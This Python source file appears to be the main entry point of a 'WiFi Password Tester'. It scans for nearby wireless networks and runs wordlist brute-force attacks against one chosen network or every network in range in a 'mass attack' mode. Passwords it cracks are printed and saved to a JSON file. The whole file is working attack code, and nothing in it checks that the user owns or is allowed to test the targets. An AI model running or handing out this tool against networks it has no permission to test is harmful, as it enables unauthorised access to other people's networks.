"""Main entry point for WiFi Password Tester."""

import sys
import time
from .scanner import scan_networks, select_network, get_network_details
from .connector import try_password
from .utils import (
    print_banner,
    get_password_source,
    get_ssid_display,
    mask_password,
    save_cracked_password,
    Colors,
)


def attack_single_network(iface, network, passwords):
    """Attack a single network with given passwords."""
    ssid_display = get_ssid_display(network)
    details = get_network_details(network)
    
    print(f"\n{Colors.CYAN}{'═' * 68}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.WHITE}[*] INITIATING ATTACK ON: {Colors.YELLOW}{ssid_display}{Colors.RESET}")
    print(f"{Colors.WHITE}[*] Wordlist size: {Colors.CYAN}{len(passwords)}{Colors.WHITE} passwords{Colors.RESET}")
    print(f"{Colors.CYAN}{'═' * 68}{Colors.RESET}\n")

    start_time = time.time()

    for idx, pw in enumerate(passwords, 1):
        masked_pw = mask_password(pw)
        print(f"{Colors.YELLOW}[{idx}/{len(passwords)}]{Colors.RESET} {Colors.WHITE}Attempting:{Colors.RESET} {Colors.CYAN}{masked_pw}{Colors.RESET}", end="", flush=True)
        
        if try_password(iface, network, pw):
            elapsed = time.time() - start_time
            print(f" {Colors.GREEN}[✓ SUCCESS]{Colors.RESET}")
            print(f"\n{Colors.GREEN}{'═' * 68}{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.GREEN}[✓] PASSWORD CRACKED!{Colors.RESET}")
            print(f"{Colors.GREEN}{'═' * 68}{Colors.RESET}")
            print(f"{Colors.WHITE}[*] Target:{Colors.RESET} {Colors.YELLOW}{ssid_display}{Colors.RESET}")
            print(f"{Colors.WHITE}[*] Password:{Colors.RESET} {Colors.GREEN}{pw}{Colors.RESET}")
            print(f"{Colors.WHITE}[*] Time elapsed:{Colors.RESET} {Colors.CYAN}{elapsed:.2f}s{Colors.RESET}")
            print(f"{Colors.WHITE}[*] Attempts:{Colors.RESET} {Colors.CYAN}{idx}/{len(passwords)}{Colors.RESET}")
            print(f"{Colors.GREEN}{'═' * 68}{Colors.RESET}")
            
            # Save to cracked.json
            save_cracked_password(ssid_display, pw, details['signal'], details['akm'], elapsed, idx)
            return True
        else:
            print(f" {Colors.RED}[✗ FAILED]{Colors.RESET}")

    elapsed = time.time() - start_time
    print(f"\n{Colors.RED}{'═' * 68}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.RED}[✗] ATTACK FAILED{Colors.RESET}")
    print(f"{Colors.RED}{'═' * 68}{Colors.RESET}")
    print(f"{Colors.WHITE}[*] No matching password found{Colors.RESET}")
    print(f"{Colors.WHITE}[*] Tested:{Colors.RESET} {Colors.CYAN}{len(passwords)}{Colors.WHITE} passwords{Colors.RESET}")
    print(f"{Colors.WHITE}[*] Time elapsed:{Colors.RESET} {Colors.CYAN}{elapsed:.2f}s{Colors.RESET}")
    print(f"{Colors.RED}{'═' * 68}{Colors.RESET}")
    return False


def attack_all_networks(iface, networks, passwords):
    """Attack all networks one by one."""
    print(f"\n{Colors.CYAN}{'═' * 68}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.WHITE}[*] MASS ATTACK MODE{Colors.RESET}")
    print(f"{Colors.WHITE}[*] Targets: {Colors.CYAN}{len(networks)}{Colors.WHITE} networks{Colors.RESET}")
    print(f"{Colors.WHITE}[*] Wordlist: {Colors.CYAN}{len(passwords)}{Colors.WHITE} passwords{Colors.RESET}")
    print(f"{Colors.CYAN}{'═' * 68}{Colors.RESET}")
    
    cracked_count = 0
    failed_count = 0
    
    for idx, network in enumerate(networks, 1):
        ssid_display = get_ssid_display(network)
        print(f"\n{Colors.YELLOW}[{idx}/{len(networks)}]{Colors.RESET} {Colors.WHITE}Targeting:{Colors.RESET} {Colors.CYAN}{ssid_display}{Colors.RESET}")
        
        if attack_single_network(iface, network, passwords):
            cracked_count += 1
        else:
            failed_count += 1
        
        # Small delay between attacks
        if idx < len(networks):
            print(f"\n{Colors.YELLOW}[*] Moving to next target...{Colors.RESET}")
            time.sleep(2)
    
    # Final summary
    print(f"\n{Colors.CYAN}{'═' * 68}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.WHITE}[*] MASS ATTACK COMPLETE{Colors.RESET}")
    print(f"{Colors.CYAN}{'═' * 68}{Colors.RESET}")
    print(f"{Colors.GREEN}[✓] Cracked:{Colors.RESET} {Colors.CYAN}{cracked_count}{Colors.RESET} networks")
    print(f"{Colors.RED}[✗] Failed:{Colors.RESET} {Colors.CYAN}{failed_count}{Colors.RESET} networks")
    print(f"{Colors.WHITE}[*] Total:{Colors.RESET} {Colors.CYAN}{len(networks)}{Colors.RESET} networks")
    print(f"{Colors.CYAN}{'═' * 68}{Colors.RESET}")


def main():
    """Main function to run the WiFi password tester."""
    print_banner()

    try:
        # Scan for networks
        networks, iface, mode = scan_networks()

        if mode == 'single':
            # Select target network
            network = select_network(networks)
            ssid_display = get_ssid_display(network)
            print(f"\n{Colors.CYAN}{'─' * 68}{Colors.RESET}")
            print(f"{Colors.GREEN}[✓] Target:{Colors.RESET} {Colors.YELLOW}{ssid_display}{Colors.RESET}")
            print(f"{Colors.CYAN}{'─' * 68}{Colors.RESET}")

            # Get passwords to test
            passwords = get_password_source()

            if not passwords:
                print(f"{Colors.RED}[✗] No passwords to test.{Colors.RESET}")
                sys.exit(1)

            # Attack single network
            attack_single_network(iface, network, passwords)
            
        elif mode == 'all':
            # Get passwords to test
            passwords = get_password_source()

            if not passwords:
                print(f"{Colors.RED}[✗] No passwords to test.{Colors.RESET}")
                sys.exit(1)

            # Attack all networks
            attack_all_networks(iface, networks, passwords)

    except KeyboardInterrupt:
        print(f"\n\n{Colors.RED}[✗] Operation cancelled by user.{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[✗] Unexpected error: {e}{Colors.RESET}")
        sys.exit(1)


if __name__ == "__main__":
    main()
